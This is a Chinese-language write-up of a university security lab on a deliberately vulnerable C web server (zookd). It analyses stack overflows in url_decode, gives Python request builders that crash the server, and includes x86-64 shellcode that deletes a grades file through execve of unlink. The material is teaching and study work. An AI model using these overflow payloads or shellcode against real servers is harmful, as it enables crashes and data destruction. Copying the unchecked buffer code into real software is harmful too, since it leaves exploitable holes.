(listen(sockfd, <span class="hljs-number">5</span>))<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;listen&quot;</span>);<br>    freeaddrinfo(res);<br><br>    <span class="hljs-keyword">return</span> sockfd;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run_server</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *port)</span> &#123;<br>    <span class="hljs-type">int</span> sockfd = start_server(port);<br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br><span class="hljs-type">int</span> cltfd = accept(sockfd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">int</span> pid;<br><span class="hljs-type">int</span> status;<br><br><span class="hljs-keyword">if</span> (cltfd &lt; <span class="hljs-number">0</span>)<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;accept&quot;</span>);<br><br><span class="hljs-comment">/* fork a new process for each client process, because the process</span><br><span class="hljs-comment"> * builds up state specific for a client (e.g. cookie and other</span><br><span class="hljs-comment"> * enviroment variables that are set by request). We want to get rid off</span><br><span class="hljs-comment"> * that state when we have processed the request and start the next</span><br><span class="hljs-comment"> * request in a pristine state.</span><br><span class="hljs-comment">         */</span><br><span class="hljs-keyword">switch</span> ((pid = fork()))<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;fork&quot;</span>);<br><br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>    process_client(cltfd);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">default</span>:<br>    close(cltfd);<br>    pid = wait(&amp;status);<br>    <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Child process %d terminated incorrectly, receiving signal %d\n&quot;</span>,<br>       pid, WTERMSIG(status));<br>    &#125;<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">accidentally</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>       __asm__(<span class="hljs-string">&quot;mov 16(%%rbp), %%rdi&quot;</span>: : :<span class="hljs-string">&quot;rdi&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看一下源代码，我们可以知道process_client是入口函数，这里定义了两个数组，env和reqpath，注释信息提示我们env是静态变量不在栈上存储，因此我们后面分析可以针对reqpath这个数组，观察其是否可以构造出溢出。继续跟进，我们看到这个数组被传入http_request_line()，我们进入这个函数</p><p>http.c (部分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">int</span> <span class="hljs-title function_">http_read_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-type">int</span> cc = read(fd, &amp;buf[i], <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (cc &lt;= <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;\r&#x27;</span>)<br>        &#123;<br>            buf[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;      <span class="hljs-comment">/* skip */</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        &#123;<br>            buf[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i &gt;= size - <span class="hljs-number">1</span>)<br>        &#123;<br>            buf[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        i++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>    <span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>    sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!sp1)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>    *sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    sp1++;<br>    <span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>    sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!sp2)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>    *sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    sp2++;<br><br>    <span class="hljs-comment">/* We only support GET and POST requests */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br>    <span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>    &#123;<br>        *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br>        <span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!sp)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>        *sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        sp++;<br><br>        <span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br>        <span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> (*colon != <span class="hljs-string">&#x27;:&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>        *colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>        <span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>            buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>            <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>                buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>        url_decode(value, sp);<br><br>        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>......<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">url_decode</span><span class="hljs-params">(<span class="hljs-type">char</span> *dst, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *src)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (src[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span> &amp;&amp; src[<span class="hljs-number">1</span>] &amp;&amp; src[<span class="hljs-number">2</span>])<br>        &#123;<br>            <span class="hljs-type">char</span> hexbuf[<span class="hljs-number">3</span>];<br>            hexbuf[<span class="hljs-number">0</span>] = src[<span class="hljs-number">1</span>];<br>            hexbuf[<span class="hljs-number">1</span>] = src[<span class="hljs-number">2</span>];<br>            hexbuf[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>            *dst = strtol(&amp;hexbuf[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>            src += <span class="hljs-number">3</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (src[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;+&#x27;</span>)<br>        &#123;<br>            *dst = <span class="hljs-string">&#x27; &#x27;</span>;<br>            src++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            *dst = *src;<br>            src++;<br><br>            <span class="hljs-keyword">if</span> (*dst == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        dst++;<br>    &#125;<br>&#125;<br>......<br><span class="hljs-type">void</span> <span class="hljs-title function_">fdprintf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *fmt, ...)</span><br>&#123;<br>    <span class="hljs-type">char</span> *s = <span class="hljs-number">0</span>;<br><br>    va_list ap;<br>    va_start(ap, fmt);<br>    vasprintf(&amp;s, fmt, ap);<br>    va_end(ap);<br><br>    write(fd, s, <span class="hljs-built_in">strlen</span>(s));<br>    <span class="hljs-built_in">free</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到参数被转递到了url_decode(reqpath, sp1)，看注释我们就可以了解，这是想对输入的请求的path进行url解码，我们继续进入url_decode函数，可以看到这个函数进行了url解码，但是问题是并没有判断复制的长度，它会将sp1中所有的内容解码后放入reqpath，直到遇到’\0’结尾为止。那么问题来了，回到http_request_line(int fd, char *reqpath, char *env, size_t *env_len)函数，buf的最大长度为8192，而之前定义的reqpath的最长长度为4096，因此，我们可以构造一个大于4096，小于8192的请求头（准确来说是头部第一行长度小于8192，但是请求的地址大于4096）。</p><p>随后继续查看其余的可能有溢出的位置，我们通过process_client可以继续往下看，有一个http_request_headers函数，进入这个函数内部，发现它定义了三个数组，buf是静态数组，长度8192，我们不考虑，因此我们看存储在栈上的两个数组value和envvar。我们阅读这个函数可以看出来，这个函数作用是解析HTTP请求的头部信息。往后看又看到了熟悉的不安全函数url_decode()，并且该函数使用了value作为参数，那么这里和上面一样，我们只需要构造一个头部的键值对，使得该键对应的值大于value的长度512，同时保证该键值对的总长度小于8192即可。</p><h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习 2"></a>练习 2</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">编写一个利用缓冲区溢出使 Web 服务器（或其创建的进程之一）崩溃的攻击。此时不需要注入代码。通过使用 gdb检查下面的最后几行来验证您的漏洞是否使服务器崩溃  `dmesg | tail`， 或观察 Web 服务器崩溃。<br></code></pre></td></tr></table></figure><p><strong>1.利用reqpath溢出</strong></p><p>根据给出的一个exploit-template.py模板去编写EXP，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment">## Things that you might find useful in constructing your exploit:</span><br>    <span class="hljs-comment">##</span><br>    <span class="hljs-comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span><br>    <span class="hljs-comment">##     returns string s with &quot;special&quot; characters percent-encoded</span><br>    <span class="hljs-comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span><br>    <span class="hljs-comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span><br><br>    req =   <span class="hljs-string">b&quot;GET /&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8000</span>):<br>         req += <span class="hljs-string">b&quot;A&quot;</span><br>    req += <span class="hljs-string">b&quot; HTTP/1.0\r\n\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br><br></code></pre></td></tr></table></figure><p>我们构造了一个长度为8000的请求地址，然后开启服务后执行这个EXP，我们就可以看到zookd服务报了一个错误，Child process 1849 terminated incorrectly, receiving signal 11，说明子进程异常终止，我们触发了栈溢出。也可以直接使用make check-crash进行测试。</p><p><strong>2.利用value溢出</strong></p><p>同理，根据前面分析的漏洞原理，我们只需要构造一个头部的键值对，保证值value大于512小于8192。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment">## Things that you might find useful in constructing your exploit:</span><br>    <span class="hljs-comment">##</span><br>    <span class="hljs-comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span><br>    <span class="hljs-comment">##     returns string s with &quot;special&quot; characters percent-encoded</span><br>    <span class="hljs-comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span><br>    <span class="hljs-comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span><br><br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;EXP: &quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8000</span>):<br>         req += <span class="hljs-string">b&quot;A&quot;</span><br>    req += <span class="hljs-string">b&quot;r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br><br></code></pre></td></tr></table></figure><p>注意键值之间需要有英文冒号和空格。验证过程同上，也会导致子进程异常。</p><h2 id="二、代码注入"><a href="#二、代码注入" class="headerlink" title="二、代码注入"></a>二、代码注入</h2><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">修改shellcode.S，解链接<span class="hljs-regexp">/home/</span>student/grades.txt。 程序集代码可以调用SYS_unlink系统调用，也可以调用unlink()库函数。 <br></code></pre></td></tr></table></figure><p>我们使用系统调用unlink，具体调用方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">argv = &#123;<span class="hljs-string">&quot;/usr/bin/unlink&quot;</span>, <span class="hljs-string">&quot;/home/student/grades.txt&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>envp = &#123;<span class="hljs-number">0</span>&#125;;<br>execve(<span class="hljs-string">&quot;/usr/bin/unlink&quot;</span>, argv, envp);<br></code></pre></td></tr></table></figure><p>我们要将C代码写成汇编的形式，为了避免高级语言编译时由于编译器的原因导致地址的变化等情况：</p><p>x86汇编有两种书写形式，分别为Intel和AT&amp;T。区别在于AT&amp;T寄存器前有%标识，且源地址在前，目的地址在后（mov src dst），Intel与之相反，目的地址在前，源地址在后（mov dst src），并且没有%标识。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#include &lt;sys/syscall.h&gt;<br><br>#define STRING&quot;/usr/bin/unlink_/home/student/grades.txt_&quot;<br>#define STRLEN41<br>#define ARGV(STRLEN+1)<br>#define ARGVONE(ARGV+8)<br>#define ARGVTWO(ARGV+16)<br>#define ENVP(ARGV+24)<br><br>.globl main<br>.typemain, @function<br><br> main:<br>jmpcalladdr<br><br> popladdr:<br>popq%rcx<br>movq%rcx,(ARGV)(%rcx)/* set up argv pointer to pathname */<br>leaq    (16)(%rcx), %rax   /* get argv1 addr */<br>movq    %rax, (ARGVONE)(%rcx) /* write argv1 addr */<br>xorq%rax, %rax/* get a 64-bit zero value */<br>movq    %rax, (ARGVTWO)(%rcx) /* argv2 is null */<br>movq%rax,(ENVP)(%rcx)/* set up null envp */<br>movb%al,(15)(%rcx)/* _ to 0 */<br>movb%al,(STRLEN - 1)(%rcx)/* null-terminate our string */<br><br>movb$SYS_execve,%al/* set up the syscall number */<br>movq%rcx,%rdi/* syscall arg 1: string pathname */<br>leaqARGV(%rcx),%rsi/* syscall arg 2: argv */<br>leaqENVP(%rcx),%rdx/* syscall arg 3: envp */<br>syscall/* invoke syscall */<br><br>xorq%rax,%rax/* get a 64-bit zero value */<br>movb    $SYS_exit,%al/* set up the syscall number */<br>xorq%rdi,%rdi/* syscall arg 1: 0 */<br>syscall/* invoke syscall */<br><br> calladdr:<br>callpopladdr<br>.asciiSTRING<br></code></pre></td></tr></table></figure><p>AT&amp;T方式寻址模式：</p><p><img src="/images/x86xunzhi.png"></p><p>上面的汇编代码使用make编译之后就可以使用<code>./run-shellcode shellcode.bin</code>，然后检查~&#x2F;grades.txt是否被删除，如果被删除就可以进行下面的工作了。</p><h3 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">构造一个劫持web服务器的控制流并解除<span class="hljs-regexp">/home/</span>student/grades.txt链接的漏洞。 将此漏洞利用保存在一个名为exploit-<span class="hljs-number">4</span>.py的文件中。 <br>建议:首先关注获取程序计数器的控制权。 勾画出在缓冲区溢出时希望程序拥有的堆栈布局，并使用gdb来验证溢出数据是否到达了预期的位置。 逐步执行函数到返回指令，以确保您可以控制程序返回的地址。 接下来，gdb中的stepi和x命令应该是有用的。 